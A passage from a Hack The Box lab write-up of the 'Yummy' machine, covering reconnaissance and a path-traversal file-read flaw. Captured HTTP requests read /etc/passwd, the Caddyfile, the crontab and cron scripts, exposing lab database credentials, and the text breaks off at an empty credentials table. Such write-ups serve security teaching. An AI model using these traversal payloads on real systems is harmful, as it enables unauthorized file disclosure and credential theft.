---
Category: HTB/Machines/Linux
tags:
  - HTB
  - Machine
  - Linux
  - Hard
  - LocalFileInclusion
  - LFI
  - XAuthToken
  - JSONWebToken
  - JWT
  - SessionTakeover
  - SQLInjection
  - SQLi
  - Mercurial
  - Hook
  - rsync
---

![](images/Yummy.png)

## Summary

The box starts with a `Local File Inclusion (LFI)` vulnerability when a `appointment` for a `booked table` should be saved as `.ics` file. This leads to the `leak` of the `source code` of the `application` and on `details` for the `creation` and `validation` of the `A-AUTH-Tokens`. Which this knowledge a `custom token` can be forged containing the `administrator role` which`grants access` to the `/admindashboard` endpoint. At the `dashboard` of the `administrator` a `SQL Injection (SQLi)` vulnerability can be used to overwrite content of the `dbstatus.json` file with some random value to trigger the `dbmonitor.sh` script which picks up a `malicious fixer-v` file placed on the box through the `SELECT INTO OUTFILE` option to gain `foothold`. From the `mysql` shell `insecure permissions` on a `directory` enables the possibility to replace a `script` with  a `malicious script` to gain `code execution` as `www-data`. The new `user context` of `www-data` gives access to a `Mercurial` which contains a binary with the `password` of the `qa` user. The newly found `credentials` can be used to `SSH` into the box and to grab the `user.txt`. For the `privilege escalation` the `sudo permissions` of `qa` are needed to abuse a `post-pull hook` while using `Mercurial` in the context of the user `dev`. From the user `dev` another step involving `sudo` is necessary to `escalate the privileges` to `root` by making use of a `wildcard` after executing `rsync`. Then the `root.txt` can be obtained and the box closed.

## Table of Contents

- [Reconnaissance](#Reconnaissance)
    - [Port Scanning](#Port-Scanning)
    - [Enumeration of Port 80/TCP](#Enumeration-of-Port-80TCP)
- [Local File Inclusion (LFI)](#Local-File-Inclusion-LFI)
- [Forging X-AUTH-Token](#Forging-X-AUTH-Token)
- [SQL Injection (SQLi)](#SQL-Injection-SQLi)
- [Foothold](#Foothold)
- [Enumeration](#Enumeration)
- [Privilege Escalation to www-data](#Privilege-Escalation-to-www-data)
- [Pivoting (www-data)](#Pivoting-www-data)
- [Privilege Escalation to qa](#Privilege-Escalation-to-qa)
- [user.txt](#usertxt)
- [Pivoting (qa)](#Pivoting-qa)
- [Privilege Escalation to dev](#Privilege-Escalation-to-dev)
    - [Mercurial Hooks](#Mercurial-Hooks)
- [Pivoting (dev)](#Pivoting-dev)
- [Privilege Escalation to root](#Privilege-Escalation-to-root)
- [root.txt](#roottxt)
- [Post Exploitation](#Post-Exploitation)

## Reconnaissance

### Port Scanning

As most of the time the box started with only port `22/TCP` and port `80/TCP` open.

```c
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV 10.129.175.114
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-05 21:02 CEST
Nmap scan report for 10.129.175.114
Host is up (0.035s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a2:ed:65:77:e9:c4:2f:13:49:19:b0:b8:09:eb:56:36 (ECDSA)
|_  256 bc:df:25:35:5c:97:24:f2:69:b4:ce:60:17:50:3c:f0 (ED25519)
80/tcp open  http    Caddy httpd
|_http-title: Did not follow redirect to http://yummy.htb/
|_http-server-header: Caddy
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.12 seconds
```

Since port `80/TCP` showed a `redirect` in the output of `Nmap` we added instantly added `yummy.htb` to our `/etc/hosts` file.

```c
┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts    
127.0.0.1       localhost
127.0.1.1       kali
10.129.175.114  yummy.htb
```

### Enumeration of Port 80/TCP

The `website` itself was running on `Caddy` and offered the option to `register`, to `login` and to `book a table`.

- [http://yummy.htb/](http://yummy.htb/)

```c
┌──(kali㉿kali)-[~]
└─$ whatweb http://yummy.htb/
http://yummy.htb/ [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[info@yummy.htb], Frame, HTML5, HTTPServer[Caddy], IP[10.129.175.114], Lightbox, Script, Title[Yummy]
```

![](images/2024-10-05_21-12_80_website.png)

![](images/2024-10-05_21-17_80_register.png)

![](images/2024-10-05_21-37_80_login.png)

So we created a random account and logged in.

![](images/2024-10-05_21-37_80_profile.png)

We started tested the `booking system` with some random values.

![](images/2024-10-05_21-38_80_booking.png)

The `booking` appeared on our `dashboard` and got cleaned up after a while. But we had the option to `save the appointment` using `.ics` files.

![](images/2024-10-05_21-39_80_dashboard.png)

We `intercepted the request` using `Burp Suite` so see that first we hit the affected `booking`  (`/reminder/21`) we tried to export and then got redirected to the corresponding `.ics` (`/export/Yummy_reservation_20241005_194025.ics`) file which contained the `appointment`.

```c
GET /reminder/21 HTTP/1.1
Host: yummy.htb
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://yummy.htb/dashboard
Accept-Encoding: gzip, deflate, br
Cookie: X-AUTH-Token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImFzZGZAYXNkZi5sb2NhbCIsInJvbGUiOiJjdXN0b21lcl8zN2I0MTQ1YiIsImlhdCI6MTcyODE1NzA2OCwiZXhwIjoxNzI4MTYwNjY4LCJqd2siOnsia3R5IjoiUlNBIiwibiI6IjExOTY1MzY1MzE5OTk1NTQwODM5ODM4MjU0MzE1OTgwMDA2OTgyMDA2NDM2ODA0MzkyMzk0MDkxNDE1NzE1MTY3MDc3NDg3NjY3OTI2MjQ2OTI4NzA5NTk3MTkwMzg3NDgyNjQxMzkxNTQ2MjI5NjMwNTc4OTYyMTExNDIyMDk0MTEwNDc4NzY0NzgxOTk3MDg3OTgwNTc0MTM4ODM3MzMzMTgwMTQwNDQ3ODM1NzgwNzc2MzcxMzU0NjY1MTk3MTY4NzExOTYxNTI3OTE3MzY2NjU4MTM0ODA5NTM4Mjg1MTc4ODEwMzcwMTU2NDAzNDkyMDU4MzUxMzg3NzI4MTE1NjU3NzE0NzQ5MjM0OTEzMDQwMzI0NDA5MjcwMzk5NzQxNDQ4Nzk3ODY0MjE1MzI4ODQ2NzI4MjI1OSIsImUiOjY1NTM3fX0.AaBt_peShaL-h4Zhld_9nzm1PGD9KcQLKInl912_0mdeOxSlFIE-CJ46Q9jnrl15i7sAE99o6qUMgKmHqkv14lc1STLq5mEj3IgN6Fq49mjVAW7yLkF4zGiRwvoSIij4pI9DVkrTtRIMr3Xabm-297i0gox2yQIt72fohX9Depktj2U
Connection: keep-alive


```

```c
HTTP/1.1 302 Found
Content-Length: 277
Content-Type: text/html; charset=utf-8
Date: Sat, 05 Oct 2024 19:40:25 GMT
Location: /export/Yummy_reservation_20241005_194025.ics
Server: Caddy
Set-Cookie: session=eyJfZmxhc2hlcyI6W3siIHQiOlsic3VjY2VzcyIsIlJlc2VydmF0aW9uIGRvd25sb2FkZWQgc3VjY2Vzc2Z1bGx5Il19XX0.ZwGWKQ.1ZyMEuebNQhHxUsq9acRUOMyNww; HttpOnly; Path=/
Vary: Cookie

<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/export/Yummy_reservation_20241005_194025.ics">/export/Yummy_reservation_20241005_194025.ics</a>. If not, click the link.

```

![](images/2024-10-05_21-40_80_export.png)

```c
GET /export/Yummy_reservation_20241005_194225.ics HTTP/1.1
Host: yummy.htb
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://yummy.htb/dashboard
Accept-Encoding: gzip, deflate, br
Cookie: X-AUTH-Token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImFzZGZAYXNkZi5sb2NhbCIsInJvbGUiOiJjdXN0b21lcl8zN2I0MTQ1YiIsImlhdCI6MTcyODE1NzA2OCwiZXhwIjoxNzI4MTYwNjY4LCJqd2siOnsia3R5IjoiUlNBIiwibiI6IjExOTY1MzY1MzE5OTk1NTQwODM5ODM4MjU0MzE1OTgwMDA2OTgyMDA2NDM2ODA0MzkyMzk0MDkxNDE1NzE1MTY3MDc3NDg3NjY3OTI2MjQ2OTI4NzA5NTk3MTkwMzg3NDgyNjQxMzkxNTQ2MjI5NjMwNTc4OTYyMTExNDIyMDk0MTEwNDc4NzY0NzgxOTk3MDg3OTgwNTc0MTM4ODM3MzMzMTgwMTQwNDQ3ODM1NzgwNzc2MzcxMzU0NjY1MTk3MTY4NzExOTYxNTI3OTE3MzY2NjU4MTM0ODA5NTM4Mjg1MTc4ODEwMzcwMTU2NDAzNDkyMDU4MzUxMzg3NzI4MTE1NjU3NzE0NzQ5MjM0OTEzMDQwMzI0NDA5MjcwMzk5NzQxNDQ4Nzk3ODY0MjE1MzI4ODQ2NzI4MjI1OSIsImUiOjY1NTM3fX0.AaBt_peShaL-h4Zhld_9nzm1PGD9KcQLKInl912_0mdeOxSlFIE-CJ46Q9jnrl15i7sAE99o6qUMgKmHqkv14lc1STLq5mEj3IgN6Fq49mjVAW7yLkF4zGiRwvoSIij4pI9DVkrTtRIMr3Xabm-297i0gox2yQIt72fohX9Depktj2U; session=eyJfZmxhc2hlcyI6W3siIHQiOlsic3VjY2VzcyIsIlJlc2VydmF0aW9uIGRvd25sb2FkZWQgc3VjY2Vzc2Z1bGx5Il19XX0.ZwGWoQ.sgoNAwPisoDITF8rW26LvYiLM9c
Connection: keep-alive


```

```c
HTTP/1.1 200 OK
Cache-Control: no-cache
Content-Disposition: attachment; filename=Yummy_reservation_20241005_194225.ics
Content-Length: 270
Content-Type: text/calendar; charset=utf-8
Date: Sat, 05 Oct 2024 19:42:39 GMT
Etag: "1728157345.3051448-270-71504303"
Last-Modified: Sat, 05 Oct 2024 19:42:25 GMT
Server: Caddy

BEGIN:VCALENDAR
VERSION:2.0
PRODID:ics.py - http://git.io/lLljaA
BEGIN:VEVENT
DESCRIPTION:Email: asdf@asdf.local\nNumber of People: 2\nMessage: asdf
DTSTART:20241005T000000Z
SUMMARY:asdf
UID:355a2700-adeb-4185-8f99-e979de0c919e@355a.org
END:VEVENT
END:VCALENDAR
```

![](images/2024-10-05_21-42_80_export_forward.png)

## Local File Inclusion (LFI)

The first thing that came to our minds was to look for `Local File Inclusion (LFI)` to see if we would be able to read any files. After a little bit of testing we forwarded the `first request` which was the `reminder` and `id` and modified the `second request` which pointed to the `.ics` file so that we were able to read `/etc/passwd`.

```c
GET /export/../../../../../etc/passwd HTTP/1.1
Host: yummy.htb
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://yummy.htb/dashboard
Accept-Encoding: gzip, deflate, br
Cookie: X-AUTH-Token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImFzZGZAYXNkZi5sb2NhbCIsInJvbGUiOiJjdXN0b21lcl8zN2I0MTQ1YiIsImlhdCI6MTcyODE1NzA2OCwiZXhwIjoxNzI4MTYwNjY4LCJqd2siOnsia3R5IjoiUlNBIiwibiI6IjExOTY1MzY1MzE5OTk1NTQwODM5ODM4MjU0MzE1OTgwMDA2OTgyMDA2NDM2ODA0MzkyMzk0MDkxNDE1NzE1MTY3MDc3NDg3NjY3OTI2MjQ2OTI4NzA5NTk3MTkwMzg3NDgyNjQxMzkxNTQ2MjI5NjMwNTc4OTYyMTExNDIyMDk0MTEwNDc4NzY0NzgxOTk3MDg3OTgwNTc0MTM4ODM3MzMzMTgwMTQwNDQ3ODM1NzgwNzc2MzcxMzU0NjY1MTk3MTY4NzExOTYxNTI3OTE3MzY2NjU4MTM0ODA5NTM4Mjg1MTc4ODEwMzcwMTU2NDAzNDkyMDU4MzUxMzg3NzI4MTE1NjU3NzE0NzQ5MjM0OTEzMDQwMzI0NDA5MjcwMzk5NzQxNDQ4Nzk3ODY0MjE1MzI4ODQ2NzI4MjI1OSIsImUiOjY1NTM3fX0.AaBt_peShaL-h4Zhld_9nzm1PGD9KcQLKInl912_0mdeOxSlFIE-CJ46Q9jnrl15i7sAE99o6qUMgKmHqkv14lc1STLq5mEj3IgN6Fq49mjVAW7yLkF4zGiRwvoSIij4pI9DVkrTtRIMr3Xabm-297i0gox2yQIt72fohX9Depktj2U; session=.eJyrVopPy0kszkgtVrKKrlZSKAFSSsWlycmpxcVKOkpBqcWpRWWJJZn5eQop-eV5OfmJKakpClAFaaU5OZVKsbU6Q0djbC0ANtJYFA.ZwGXyA.ROiTvbuhJOPpj6r5OawxBDUrlf4
Connection: keep-alive


```

```c
HTTP/1.1 200 OK
Cache-Control: no-cache
Content-Disposition: attachment; filename=passwd
Content-Length: 2033
Content-Type: application/octet-stream
Date: Sat, 05 Oct 2024 19:47:37 GMT
Etag: "1727686952.3123646-2033-499387653"
Last-Modified: Mon, 30 Sep 2024 09:02:32 GMT
Server: Caddy

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
dhcpcd:x:100:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false
messagebus:x:101:102::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin
pollinate:x:102:1::/var/cache/pollinate:/bin/false
polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin
syslog:x:103:104::/nonexistent:/usr/sbin/nologin
uuidd:x:104:105::/run/uuidd:/usr/sbin/nologin
tcpdump:x:105:107::/nonexistent:/usr/sbin/nologin
tss:x:106:108:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:107:109::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
usbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
dev:x:1000:1000:dev:/home/dev:/bin/bash
mysql:x:110:110:MySQL Server,,,:/nonexistent:/bin/false
caddy:x:999:988:Caddy web server:/var/lib/caddy:/usr/sbin/nologin
postfix:x:111:112::/var/spool/postfix:/usr/sbin/nologin
qa:x:1001:1001::/home/qa:/bin/bash
_laurel:x:996:987::/var/log/laurel:/bin/false

```

![](images/2024-10-05_21-49_80_lfi.png)

| Username |
| -------- |
| dev      |
| qa       |

Since we knew that the website was running on `Caddy` we started with the `Caddyfile` to look for anything useful. But unfortunately there was nothing we could leverage to make progress.

```c
GET /export/../../../../../etc/caddy/Caddyfile HTTP/1.1
Host: yummy.htb
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://yummy.htb/dashboard
Accept-Encoding: gzip, deflate, br
Cookie: X-AUTH-Token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImFzZGZAYXNkZi5sb2NhbCIsInJvbGUiOiJjdXN0b21lcl8zN2I0MTQ1YiIsImlhdCI6MTcyODE1NzA2OCwiZXhwIjoxNzI4MTYwNjY4LCJqd2siOnsia3R5IjoiUlNBIiwibiI6IjExOTY1MzY1MzE5OTk1NTQwODM5ODM4MjU0MzE1OTgwMDA2OTgyMDA2NDM2ODA0MzkyMzk0MDkxNDE1NzE1MTY3MDc3NDg3NjY3OTI2MjQ2OTI4NzA5NTk3MTkwMzg3NDgyNjQxMzkxNTQ2MjI5NjMwNTc4OTYyMTExNDIyMDk0MTEwNDc4NzY0NzgxOTk3MDg3OTgwNTc0MTM4ODM3MzMzMTgwMTQwNDQ3ODM1NzgwNzc2MzcxMzU0NjY1MTk3MTY4NzExOTYxNTI3OTE3MzY2NjU4MTM0ODA5NTM4Mjg1MTc4ODEwMzcwMTU2NDAzNDkyMDU4MzUxMzg3NzI4MTE1NjU3NzE0NzQ5MjM0OTEzMDQwMzI0NDA5MjcwMzk5NzQxNDQ4Nzk3ODY0MjE1MzI4ODQ2NzI4MjI1OSIsImUiOjY1NTM3fX0.AaBt_peShaL-h4Zhld_9nzm1PGD9KcQLKInl912_0mdeOxSlFIE-CJ46Q9jnrl15i7sAE99o6qUMgKmHqkv14lc1STLq5mEj3IgN6Fq49mjVAW7yLkF4zGiRwvoSIij4pI9DVkrTtRIMr3Xabm-297i0gox2yQIt72fohX9Depktj2U; session=.eJyrVopPy0kszkgtVrKKrlZSKAFSSsWlycmpxcVKOkpBqcWpRWWJJZn5eQop-eV5OfmJKakpClAFaaU5OZVKsbU6oxpxa4ytBQBnkYF6.ZwGdOw.ZsKzKfoi8yaemRZsTcFAQUfSAiI
Connection: keep-alive


```

```c
HTTP/1.1 200 OK
Cache-Control: no-cache
Content-Disposition: attachment; filename=Caddyfile
Content-Length: 178
Content-Type: application/octet-stream
Date: Sat, 05 Oct 2024 20:10:58 GMT
Etag: "1715978794.806761-178-2534936570"
Last-Modified: Fri, 17 May 2024 20:46:34 GMT
Server: Caddy

:80 {
    @ip {
        header_regexp Host ^(\d{1,3}\.){3}\d{1,3}$
    }
    redir @ip http://yummy.htb{uri}
    reverse_proxy 127.0.0.1:3000 {
    header_down -Server  
    }
}

```

![](images/2024-10-05_22-11_80_lfi_caddyfile.png)

Next we looked for anything inside `crontab` and luckily for us there was some `configuration` done for various `bash scripts` to be executed.

```c
GET /export/../../../../../etc/crontab HTTP/1.1
Host: yummy.htb
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://yummy.htb/dashboard
Accept-Encoding: gzip, deflate, br
Cookie: X-AUTH-Token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImFzZGZAYXNkZi5sb2NhbCIsInJvbGUiOiJjdXN0b21lcl81NmQ1MmRhZiIsImlhdCI6MTcyODE5NTQ5MywiZXhwIjoxNzI4MTk5MDkzLCJqd2siOnsia3R5IjoiUlNBIiwibiI6IjExOTY1MzY1MzE5OTk1NTQwODM5ODM4MjU0MzE1OTgwMDA2OTgyMDA2NDM2ODA0MzkyMzk0MDkxNDE1NzE1MTY3MDc3NDg3NjY3OTI2MjQ2OTI4NzA5NTk3MTkwMzg3NDgyNjQxMzkxNTQ2MjI5NjMwNTc4OTYyMTExNDIyMDk0MTEwNDc4NzY0NzgxOTk3MDg3OTgwNTc0MTM4ODM3MzMzMTgwMTQwNDQ3ODM1NzgwNzc2MzcxMzU0NjY1MTk3MTY4NzExOTYxNTI3OTE3MzY2NjU4MTM0ODA5NTM4Mjg1MTc4ODEwMzcwMTU2NDAzNDkyMDU4MzUxMzg3NzI4MTE1NjU3NzE0NzQ5MjM0OTEzMDQwMzI0NDA5MjcwMzk5NzQxNDQ4Nzk3ODY0MjE1MzI4ODQ2NzI4MjI1OSIsImUiOjY1NTM3fX0.CBJJq2aEeAI732WsFiMZ9qMrI38gRAf_JnEG4z0tciidHCGLLsoaIo-yHU0jece7_rPDkR_LpjlG7AbWbe5_CrWSYo9AIvSn2oS2IgPi2QZE8frsiqUSV6-REB4FeHK6mMDa0LEdhJ33Z0cVjt91WjG3N9Y3KfmJROqZc0UWCmkFoIA; session=eyJfZmxhc2hlcyI6W3siIHQiOlsic3VjY2VzcyIsIlJlc2VydmF0aW9uIGRvd25sb2FkZWQgc3VjY2Vzc2Z1bGx5Il19XX0.ZwIrxw.hDCZU2hEYiJaW6sEImBp0dYucSc
Connection: keep-alive


```

```c
HTTP/1.1 200 OK
Cache-Control: no-cache
Content-Disposition: attachment; filename=crontab
Content-Length: 1308
Content-Type: application/octet-stream
Date: Sun, 06 Oct 2024 06:19:10 GMT
Etag: "1726753214.5820017-1308-537201936"
Last-Modified: Thu, 19 Sep 2024 13:40:14 GMT
Server: Caddy

# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
# You can also override PATH, but by default, newer versions inherit it from the environment
#PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *    root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *    root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7    root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *    root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
#
*/1 * * * * www-data /bin/bash /data/scripts/app_backup.sh
*/15 * * * * mysql /bin/bash /data/scripts/table_cleanup.sh
* * * * * mysql /bin/bash /data/scripts/dbmonitor.sh

```

![](images/2024-10-06_08-20_80_lfi_crontab.png)

We started with the `app_backup.sh` script which basically created a `.zip` file of the content inside `/opt/app/`.

```c
GET /export/../../../../../data/scripts/app_backup.sh HTTP/1.1
Host: yummy.htb
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://yummy.htb/dashboard
Accept-Encoding: gzip, deflate, br
Cookie: X-AUTH-Token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImFzZGZAYXNkZi5sb2NhbCIsInJvbGUiOiJjdXN0b21lcl81NmQ1MmRhZiIsImlhdCI6MTcyODE5NTQ5MywiZXhwIjoxNzI4MTk5MDkzLCJqd2siOnsia3R5IjoiUlNBIiwibiI6IjExOTY1MzY1MzE5OTk1NTQwODM5ODM4MjU0MzE1OTgwMDA2OTgyMDA2NDM2ODA0MzkyMzk0MDkxNDE1NzE1MTY3MDc3NDg3NjY3OTI2MjQ2OTI4NzA5NTk3MTkwMzg3NDgyNjQxMzkxNTQ2MjI5NjMwNTc4OTYyMTExNDIyMDk0MTEwNDc4NzY0NzgxOTk3MDg3OTgwNTc0MTM4ODM3MzMzMTgwMTQwNDQ3ODM1NzgwNzc2MzcxMzU0NjY1MTk3MTY4NzExOTYxNTI3OTE3MzY2NjU4MTM0ODA5NTM4Mjg1MTc4ODEwMzcwMTU2NDAzNDkyMDU4MzUxMzg3NzI4MTE1NjU3NzE0NzQ5MjM0OTEzMDQwMzI0NDA5MjcwMzk5NzQxNDQ4Nzk3ODY0MjE1MzI4ODQ2NzI4MjI1OSIsImUiOjY1NTM3fX0.CBJJq2aEeAI732WsFiMZ9qMrI38gRAf_JnEG4z0tciidHCGLLsoaIo-yHU0jece7_rPDkR_LpjlG7AbWbe5_CrWSYo9AIvSn2oS2IgPi2QZE8frsiqUSV6-REB4FeHK6mMDa0LEdhJ33Z0cVjt91WjG3N9Y3KfmJROqZc0UWCmkFoIA; session=.eJyrVopPy0kszkgtVrKKrlZSKAFSSsWlycmpxcVKOkpBqcWpRWWJJZn5eQop-eV5OfmJKakpClAFaaU5OZVKsbU65GqMrQUAdo0urg.ZwIsMw.epzHKgwxzAGn_QPPUPn6z8I8DjM
Connection: keep-alive


```

```c
HTTP/1.1 200 OK
Cache-Control: no-cache
Content-Disposition: attachment; filename=app_backup.sh
Content-Length: 90
Content-Type: text/x-sh; charset=utf-8
Date: Sun, 06 Oct 2024 06:21:04 GMT
Etag: "1727364692.0530195-90-354751206"
Last-Modified: Thu, 26 Sep 2024 15:31:32 GMT
Server: Caddy

#!/bin/bash

cd /var/www
/usr/bin/rm backupapp.zip
/usr/bin/zip -r backupapp.zip /opt/app

```

![](images/2024-10-06_08-21_80_lfi_appbackup.png)

Then we took a closer look on `table_cleanup.sh` and found some `credentials` for the `MySQL Database`.

```c
GET /export/../../../../../data/scripts/table_cleanup.sh HTTP/1.1
Host: yummy.htb
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://yummy.htb/dashboard
Accept-Encoding: gzip, deflate, br
Cookie: X-AUTH-Token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImFzZGZAYXNkZi5sb2NhbCIsInJvbGUiOiJjdXN0b21lcl81NmQ1MmRhZiIsImlhdCI6MTcyODE5NTQ5MywiZXhwIjoxNzI4MTk5MDkzLCJqd2siOnsia3R5IjoiUlNBIiwibiI6IjExOTY1MzY1MzE5OTk1NTQwODM5ODM4MjU0MzE1OTgwMDA2OTgyMDA2NDM2ODA0MzkyMzk0MDkxNDE1NzE1MTY3MDc3NDg3NjY3OTI2MjQ2OTI4NzA5NTk3MTkwMzg3NDgyNjQxMzkxNTQ2MjI5NjMwNTc4OTYyMTExNDIyMDk0MTEwNDc4NzY0NzgxOTk3MDg3OTgwNTc0MTM4ODM3MzMzMTgwMTQwNDQ3ODM1NzgwNzc2MzcxMzU0NjY1MTk3MTY4NzExOTYxNTI3OTE3MzY2NjU4MTM0ODA5NTM4Mjg1MTc4ODEwMzcwMTU2NDAzNDkyMDU4MzUxMzg3NzI4MTE1NjU3NzE0NzQ5MjM0OTEzMDQwMzI0NDA5MjcwMzk5NzQxNDQ4Nzk3ODY0MjE1MzI4ODQ2NzI4MjI1OSIsImUiOjY1NTM3fX0.CBJJq2aEeAI732WsFiMZ9qMrI38gRAf_JnEG4z0tciidHCGLLsoaIo-yHU0jece7_rPDkR_LpjlG7AbWbe5_CrWSYo9AIvSn2oS2IgPi2QZE8frsiqUSV6-REB4FeHK6mMDa0LEdhJ33Z0cVjt91WjG3N9Y3KfmJROqZc0UWCmkFoIA; session=.eJyrVopPy0kszkgtVrKKrlZSKAFSSsWlycmpxcVKOkpBqcWpRWWJJZn5eQop-eV5OfmJKakpClAFaaU5OZVKsbU6oxpxa4ytBQBnkYF6.ZwItyg.hsrXbXS2UpbyaeUkRX_bZPpT-O8
Connection: keep-alive


```

```c
HTTP/1.1 200 OK
Cache-Control: no-cache
Content-Disposition: attachment; filename=table_cleanup.sh
Content-Length: 114
Content-Type: text/x-sh; charset=utf-8
Date: Sun, 06 Oct 2024 06:27:45 GMT
Etag: "1727364676.2200189-114-1364268060"
Last-Modified: Thu, 26 Sep 2024 15:31:16 GMT
Server: Caddy

#!/bin/sh

/usr/bin/mysql -h localhost -u chef yummy_db -p'3wDo7gSRZIwIHRxZ!' < /data/scripts/sqlappointments.sql

```

![](images/2024-10-06_08-28_80_lfi_database_credentials.png)

| Username | Password          |
| -------- | ----------------- |
